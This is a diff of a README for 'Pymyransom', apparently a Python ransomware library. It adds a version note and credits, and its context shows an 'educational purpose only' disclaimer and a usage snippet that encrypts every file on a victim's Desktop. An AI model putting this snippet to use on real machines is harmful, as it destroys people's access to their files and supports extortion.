@@ -1,5 +1,8 @@
 # Pymyransom
 
+## New in v0.4
+Updated description
+
 ## Before Introducing
 
 PYMYRANSOM **ONLY** CAN BE USED FOR EDUCATIONAL PURPOSE!!!
@@ -59,3 +62,6 @@ Victim = pymyransom.makeMyRansomware(your_extension=".Example")
 startpath = 'c:\\Users\\'+Victim.username+'\\Desktop\\**' #Used glob to encrypt all files
 Victim.Encryptor(startpath)
 ```
+
+## Special Thanks
+https://github.com/marcosValle/, https://github.com/kevin5871/, And you!
